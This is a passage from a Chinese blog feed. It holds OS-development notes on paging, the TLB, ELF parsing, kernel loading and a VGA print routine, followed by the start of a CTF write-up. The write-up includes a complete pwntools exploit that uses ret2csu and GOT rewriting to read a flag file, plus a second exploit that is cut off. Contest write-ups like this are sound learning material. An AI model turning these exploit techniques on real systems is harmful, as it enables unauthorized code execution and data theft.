alt="img"></p><p>这边解释一下为什么会有这种奇怪的映射，因为页目录表的最后一项页目录项是页表的物理地址，对应虚拟地址的高10位为0x3ff</p><p>此时页目录项为<code>0x100000</code>，最后一个页表项还是原来的页目录项，就是这玩意被用了两次，第一次当页目录项，第二次当页表项，无限套娃。其余两个也是这个思路，所以访问<code>0xfffffXXX</code>的虚拟地址，就能访问页表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0xfffff000-0xffffffff -&gt; 0x000000100000-0x000000100fff<br></code></pre></td></tr></table></figure><h3 id="TLB"><a href="#TLB" class="headerlink" title="TLB"></a>TLB</h3><p>在二级页表中，从虚拟地址转换到物理地址需要访问三次内存，那三级、四级页表怎么办？对于<code>CPU</code>来说，访问内存无疑是一种降低效率的行为，所以<code>TLB</code>（Translation Lookaside Buffer，快表）就出现了。</p><p><code>TLB</code> 中的条目是虚拟地址的高 20 位到物理地址高 20 位的映射结果。<code>TLB</code>将近期访问的虚拟地址转换成物理地址后，一一对应储存起来，当<code>CPU</code>下一次需要转换时，会先来<code>TLB</code>中查询，查到就直接拿去用，如果没查到对应的物理地址，会在转换后更新<code>TLB</code>。</p><p>可以使用<code>invlpg</code>指令更新<code>TLB</code></p><h2 id="load-kernel！"><a href="#load-kernel！" class="headerlink" title="load kernel！"></a>load kernel！</h2><p>对于linux kernel，并不采用纯汇编的方式来编写（虽然这8是8行😅），将C和汇编结合起来会更便于理解</p><p>因为我们是在linux操作系统中，kernel的文件格式是elf，所以在loader kernel文件前，我们还需要对elf文件有足够了解</p><h3 id="elf-文件"><a href="#elf-文件" class="headerlink" title="elf 文件"></a>elf 文件</h3><p>ELF，Executable and Linkable Format，可执行链接格式。</p><p>ELF文件提供了两种文件视图，链接格式视图和执行格式视图。链接视图是以节（section）为单位，执行视图是以段（segment）为单位。接视图就是在链接时用到的视图，而执行视图则是在执行时用到的视图。</p><p><img src="/img/OS/25.png" alt="img"></p><p>先来看看elf header</p><h4 id="ELF-header"><a href="#ELF-header" class="headerlink" title="ELF header"></a>ELF header</h4><p>ELF header位于文件的开始位置，它的主要目的是定位文件的其他部分</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs assembly">typedef struct elf32_hdr<br>&#123;<br>  unsigned chare_ident[EI_NIDENT];/* Magic number and other info */<br>  Elf32_Halfe_type;/* Object file type */<br>  Elf32_Halfe_machine;/* Architecture */<br>  Elf32_Worde_version;/* Object file version */<br>  Elf32_Addre_entry;/* Entry point virtual address */<br>  Elf32_Offe_phoff;/* Program header table file offset */<br>  Elf32_Offe_shoff;/* Section header table file offset */<br>  Elf32_Worde_flags;               /* Processor-specific flags */<br>  Elf32_Halfe_ehsize;/* ELF header size in bytes */<br>  Elf32_Halfe_phentsize;/* Program header table entry size */<br>  Elf32_Halfe_phnum;/* Program header table entry count */<br>  Elf32_Halfe_shentsize;/* Section header table entry size */<br>  Elf32_Halfe_shnum;/* Section header table entry count */<br>  Elf32_Halfe_shstrndx;/* Section header string table index */<br>&#125; Elf32_Ehdr;<br></code></pre></td></tr></table></figure><p><strong>e_ident：</strong>16字节，含义如下图</p><p><img src="/img/OS/27.png" alt="img"></p><p><strong>e_type：</strong>2字节，文件类型，类型有以下几个</p><p><img src="/img/OS/28.png" alt="img"></p><p><strong>e_machine：</strong>2字节，文件架构，有以下几个架构</p><p><img src="/img/OS/29.png" alt="img"></p><p>用<code>readelf -h</code>即可查看elf header详细信息</p><p><img src="/img/OS/26.png" alt="img"></p><h4 id="Program-header-table"><a href="#Program-header-table" class="headerlink" title="Program header table"></a>Program header table</h4><p>位于elf header之后，程序头表(Program header table)列举了有效的段(segments)和他们的属性（执行视图）</p><p>程序头是一个结构的数组，每一个结构都表示一个段(segments)。在可执行文件或者共享链接库中所有的节(sections)都被分为不同的几个段(segments)。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs assembly">typedef struct elf32_phdr&#123;<br>  Elf32_Wordp_type;   <br>  Elf32_Off    p_offset;<br>  Elf32_Addrp_vaddr;<br>  Elf32_Addrp_paddr;<br>  Elf32_Wordp_filesz;<br>  Elf32_Wordp_memsz;<br>  Elf32_Wordp_flags;<br>  Elf32_Wordp_align;<br>&#125; Elf32_Phdr;<br></code></pre></td></tr></table></figure><p>程序头的索引地址(e_phoff)、段数量(e_phnum)、表项大小(e_phentsize)都是通过 ELF头部信息获取的。</p><p><strong>p_type：</strong>指明该段的类型</p><p><img src="/img/OS/30.png" alt="img"></p><p><strong>p_flags：</strong>指明该段的标志</p><p><img src="/img/OS/31.png" alt="img"></p><p>下图画红线的0x20字节便是一个程序头表</p><p><img src="/img/OS/32.png" alt="img"></p><p>当然，也可以使用<code>readelf -l</code>得到详细信息</p><p><img src="/img/OS/33.png" alt="img"></p><p>以上，便是elf文件浅析</p><h3 id="now-lets’s-go"><a href="#now-lets’s-go" class="headerlink" title="now lets’s go!"></a>now lets’s go!</h3><p>先随便写个kernel，内联汇编用起来还是爽的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs assembly">#include &lt;stdio.h&gt;<br><br>int main(void)<br>&#123;<br>while(1)<br>&#123;<br>asm(<br>    &quot;mov byte ptr [gs:170], &#x27;W&#x27;;&quot;<br>    &quot;mov byte ptr [gs:172], &#x27;E&#x27;;&quot;<br>    &quot;mov byte ptr [gs:174], &#x27;L&#x27;;&quot;<br>    &quot;mov byte ptr [gs:176], &#x27;C&#x27;;&quot;<br>    &quot;mov byte ptr [gs:178], &#x27;O&#x27;;&quot;<br>    &quot;mov byte ptr [gs:180], &#x27;M&#x27;;&quot;<br>    &quot;mov byte ptr [gs:182], &#x27;E&#x27;;&quot;<br>    &quot;mov byte ptr [gs:184], &#x27; &#x27;;&quot;<br>    &quot;mov byte ptr [gs:186], &#x27;k&#x27;;&quot;<br>    &quot;mov byte ptr [gs:188], &#x27;o&#x27;;&quot;<br>    &quot;mov byte ptr [gs:190], &#x27;r&#x27;;&quot;<br>    &quot;mov byte ptr [gs:192], &#x27;e&#x27;;&quot;<br>    &quot;mov byte ptr [gs:194], &#x27;y&#x27;;&quot;<br>    &quot;mov byte ptr [gs:196], &#x27;&#x27;&#x27;;&quot;<br>    &quot;mov byte ptr [gs:198], &#x27;O&#x27;;&quot;<br>    &quot;mov byte ptr [gs:200], &#x27;S&#x27;;&quot;<br>);<br>&#125;<br>return 0;    <br>&#125;<br></code></pre></td></tr></table></figure><p>我们需要将kernel载入到内存中，完成解析，书中是将kernel载入到0x70000处，解析程序入口到0x1500处，笔者也就照着来了。</p><p>用脚本完成编译链接，0x1500对应的虚拟地址为0xc0001500</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/sh</span><br>gcc -m32 -c ./kernel/kernel.c -o ./kernel/kernel.o -masm=intel<br>ld -melf_i386 ./kernel/kernel.o -Ttext 0xc0001500 -e main -o ./kernel/kernel.bin<br></code></pre></td></tr></table></figure><p>完成载入和解析后，便可以跳到kernel处，load的任务就结束了（我的任务完成啦🤪）</p><p>以下便是代码的变化</p><p><strong>boot.inc</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs assembly">;-----add-----<br>KERNEL_START_SECTORequ 0x9<br>KERNEL_BIN_BASE_ADDRequ 0x70000<br>KERNEL_ENTRY_POINTequ 0xc0001500<br>PT_NULLequ 0<br></code></pre></td></tr></table></figure><p><strong>pack.sh</strong></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">dd <span class="hljs-attribute">if</span>=./kernel/kernel.bin \<br>        <span class="hljs-attribute">of</span>=./img.img \<br>        <span class="hljs-attribute">bs</span>=512 <span class="hljs-attribute">count</span>=200 <span class="hljs-attribute">seek</span>=9 <span class="hljs-attribute">conv</span>=notrunc<br></code></pre></td></tr></table></figure><p><strong>load.s</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs assembly">;开启保护模式......<br>p_mode_start:<br>mov ax,SELECTOR_DATA<br>mov ds,ax<br>mov es,ax<br>mov ss,ax<br>mov esp,LOADER_STACK_TOP<br>mov ax,SELECTOR_VIDEO<br>mov gs,ax<br><br>mov eax, KERNEL_START_SECTOR<br>mov ebx, KERNEL_BIN_BASE_ADDR<br>mov ecx, 200<br>call rd_disk_m_32                       ;和rd_dsik_m_16一样，寄存器换成32位就行<br><br>call setup_page                         <br><br>sgdt [gdt_ptr]<br>mov ebx, [gdt_ptr + 2]<br>or dword [ebx + 0x18 + 4], 0xc0000000<br>add dword [gdt_ptr + 2], 0xc0000000<br>add esp, 0xc0000000<br><br>mov eax, PAGE_DIR_TABLE_POS<br>mov cr3, eax<br><br>mov eax, cr0<br>or eax, 0x80000000<br>mov cr0, eax<br><br>lgdt [gdt_ptr]                          ;开启分页<br><br>jmp SELECTOR_CODE:enter_kernel          ;刷新流水线，虽然不刷也莫得关系<br><br>enter_kernel:<br>call kernel_init<br>mov esp, 0xc009f000<br>jmp KERNEL_ENTRY_POINT<br><br><br>;......<br>kernel_init:<br>[bits 32]<br>xor eax, eax<br>xor ebx, ebx<br>xor ecx, ecx<br>xor edx, edx<br><br>mov dx, [KERNEL_BIN_BASE_ADDR + 42]         ;length of program header<br>mov ebx, [KERNEL_BIN_BASE_ADDR + 28]        <br>add ebx, KERNEL_BIN_BASE_ADDR               ;program header table start address<br>mov cx, [KERNEL_BIN_BASE_ADDR+44]           ;count of program header<br><br>.each_segment:<br>cmp byte[ebx + 0],PT_NULL               ;if [ebx+0] == 0,the program header is empty<br>je .PTNULL<br><br>push dword [ebx + 16]                   ;segment size<br>mov eax, [ebx+4]<br>add eax, KERNEL_BIN_BASE_ADDR<br>push eax                                ;src<br>push dword [ebx + 8]                    ;dst<br><br>call mem_cpy<br>add esp, 12                             ;recover<br><br>.PTNULL:<br>add ebx, edx                            ;next program header<br>loop .each_segment<br>ret<br><br>mem_cpy:                                     ;模仿memcpy函数，待我去看看memcpy源码<br>cld<br>push ebp<br>mov ebp, esp<br>push ecx<br><br>mov edi, [ebp+8]<br>mov esi, [ebp+12]<br>mov ecx, [ebp+16]<br>rep movsb                                ;将ds:esi处size为ecx的data，复制到es:edi处，逐字节拷贝<br><br>pop ecx<br>leave                                    ;恢复栈帧<br>ret<br></code></pre></td></tr></table></figure><p>最后的效果的就是这样</p><p><img src="/img/OS/34.png" alt="img"></p><h1 id="0x4-实现自己的输出函数"><a href="#0x4-实现自己的输出函数" class="headerlink" title="0x4:实现自己的输出函数"></a>0x4:实现自己的输出函数</h1><p>print.S</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><code class="hljs assembly">TI_GDTequ 0<br>RPL0 equ 0<br>SELECTOR_VIDEOequ (0x0003&lt;&lt;3) + TI_GDT + RPL0<br><br>[bits 32]<br>section .text<br><br>global put_char<br><br>put_char:<br>[bits 32]<br>pushad<br>mov ax, SELECTOR_VIDEO<br>mov gs, ax<br><br>mov dx, 0x3d4<br>mov al, 0x0e<br>out dx, al<br>mov dx, 0x03d5<br>in al, dx<br>mov ah, al<br><br>mov dx, 0x3d4<br>mov al, 0x0f<br>out dx, al<br>mov dx, 0x03d5<br>in al, dx<br><br>mov bx, ax<br>mov ecx, [esp+36]<br><br>cmp cl, 0x0d<br>jz .is_carriage_return<br>cmp cl, 0xa<br>jz .is_line_feed           <br><br>cmp cl, 0x8<br>jz .is_backspace<br>jmp .put_other<br><br>.is_backspace:<br>[bits 32]<br>dec bx<br>shl bx, 1<br><br>mov byte [gs:bx], 0x20<br>inc bx<br>mov byte [gs:bx], 0x7<br>shr bx, 1<br>jmp .set_cursor<br><br><br>.put_other:<br>        [bits 32]<br>shl bx, 1<br>mov [gs:bx], cl<br>inc bx<br>mov byte [gs:bx], 0x7<br>shr bx, 1<br>inc bx<br>cmp bx, 2000<br>jl .set_cursor<br><br>.is_line_feed:<br>[bits 32]<br>add bx, 80<br>cmp bx, 2000<br>jl .set_cursor<br><br>.is_carriage_return:<br>[bits 32]<br>xor dx, dx<br>mov ax, bx<br>mov si, 80<br>div si<br>sub bx, dx<br><br>jmp .set_cursor<br><br>.roll_screen:<br>[bits 32]<br>cld <br>mov eax, 960<br><br>mov esi, 0xc00b80a0<br>mov edi, 0xc00b8000<br>rep movsd<br><br>mov ebx, 3840<br>mov ecx, 80<br><br>.cls:<br>[bits 32]<br>mov word [gs:ebx], 0x720<br>add ebx, 2<br>loop .cls<br>mov bx, 1920<br><br>.set_cursor:<br>[bits 32]<br>mov dx, 0x3d4<br>mov al,0x0e<br>out dx, al<br>mov dx, 0x03d5<br>mov al, bh<br>out dx, al<br><br>mov dx, 0x3d4<br>mov al, 0xf<br>out dx,al<br>mov dx, 0x03d5<br>mov al, bl<br>out dx, al<br><br>.put_char_done:<br>[bits 32]<br>popad<br>ret<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Record-of-Learn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>OS</tag>
      
      <tag>linux</tag>
      
      <tag>kernel</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>11月比赛合集</title>
    <link href="/2023/11/02/11/"/>
    <url>/2023/11/02/11/</url>
    
    <content type="html"><![CDATA[<h1 id="鹏城杯"><a href="#鹏城杯" class="headerlink" title="鹏城杯"></a>鹏城杯</h1><p>甲级战犯第一场</p><h2 id="silent"><a href="#silent" class="headerlink" title="silent"></a>silent</h2><p>用一个magic gadget + ret2csu直接打</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br><br><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./silent&#x27;</span>)<br>flag = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> flag:<br>    p = remote(<span class="hljs-string">&#x27;172.10.0.8&#x27;</span>, <span class="hljs-number">9999</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(<span class="hljs-string">&quot;silent&quot;</span>)<br>sa = <span class="hljs-keyword">lambda</span> s,n : p.sendafter(s,n)<br>sla = <span class="hljs-keyword">lambda</span> s,n : p.sendlineafter(s,n)<br>sl = <span class="hljs-keyword">lambda</span> s : p.sendline(s)<br>sd = <span class="hljs-keyword">lambda</span> s : p.send(s)<br>rc = <span class="hljs-keyword">lambda</span> n : p.recv(n)<br>ru = <span class="hljs-keyword">lambda</span> s : p.recvuntil(s)<br>ti = <span class="hljs-keyword">lambda</span> : p.interactive()<br>leak = <span class="hljs-keyword">lambda</span> name,addr :log.success(name+<span class="hljs-string">&quot;---&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(addr))<br><br>ret2csu_front = <span class="hljs-number">0x0000000000400940</span><br>ret2csu_behind = <span class="hljs-number">0x000000000040095A</span><br>magic_gadget = <span class="hljs-number">0x00000000004007e8</span><br>stdout_got = <span class="hljs-number">0x601020</span><br>bss = <span class="hljs-number">0x602000</span><br><br><span class="hljs-comment">#0x00000000004007e8 : add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; ret</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">set_offset</span>(<span class="hljs-params">target,raw</span>):<br>    offset = target - raw<br>    <span class="hljs-keyword">if</span> offset &lt; <span class="hljs-number">0</span>:<br>        offset = offset + <span class="hljs-number">0x100000000</span><br>    <span class="hljs-keyword">return</span> offset<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">set_vuln</span>(<span class="hljs-params">offset,target</span>):<br>    payload = flat([<br>        ret2csu_behind,<br>        offset,<br>        target+<span class="hljs-number">0x3d</span>,<br>        <span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<br>        magic_gadget,<br>    ])<br>    <span class="hljs-keyword">return</span> payload<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ret2csu</span>(<span class="hljs-params">rdi,rsi,rdx,vuln</span>):<br>    payload = flat([<br>        ret2csu_behind,<br>        <span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<br>        vuln,<br>        rdi,rsi,rdx,<br>        ret2csu_front,<br>        <span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<br>    ])<br>    <span class="hljs-keyword">return</span> payload<br><br>payload1 = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x48</span> + ret2csu(<span class="hljs-number">0</span>,bss,<span class="hljs-number">0x300</span>,elf.got[<span class="hljs-string">&#x27;read&#x27;</span>]) + p64(<span class="hljs-number">0x400878</span>)<br><br>sd(payload1.ljust(<span class="hljs-number">0x100</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><br>payload2 = <span class="hljs-string">b&#x27;./flag\x00\x00&#x27;</span> + set_vuln(set_offset(libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>],libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stdout_&#x27;</span>]),stdout_got)<br>payload2 += ret2csu(bss,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,stdout_got)<br>payload2 += ret2csu(<span class="hljs-number">3</span>,bss+<span class="hljs-number">0x500</span>,<span class="hljs-number">0x40</span>,elf.got[<span class="hljs-string">&#x27;read&#x27;</span>])<br>payload2 += set_vuln(set_offset(libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>],libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>]),stdout_got)<br>payload2 += ret2csu(<span class="hljs-number">1</span>,bss+<span class="hljs-number">0x500</span>,<span class="hljs-number">0x40</span>,stdout_got)<br>payload2 = payload2.ljust(<span class="hljs-number">0x300</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>sd(payload2)<br><br>payload3 = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x40</span> + p64(bss) + p64(<span class="hljs-number">0x0000000000400876</span>)<br>sd(payload3.ljust(<span class="hljs-number">0x100</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="auto-coffee"><a href="#auto-coffee" class="headerlink" title="auto coffee"></a>auto coffee</h2><p>能直接覆写第二个指针组的，sb了我淦</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br><br><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span>)<br><span class="hljs-comment"># elf = ELF(&#x27;./challenge&#x27;)</span><br>flag = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> flag:<br>    p = remote(<span class="hljs-string">&#x27;43.132.193.22&#x27;</span>, <span class="hljs-number">9998</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(<span class="hljs-string">&quot;./coffee&quot;</span>)<br>sa = <span class="hljs-keyword">lambda</span> s,n : p.sendafter(s,n)<br>sla = <span class="hljs-keyword">lambda</span> s,n : p.sendlineafter(s,n)<br>sl = <span class="hljs-keyword">lambda</span> s : 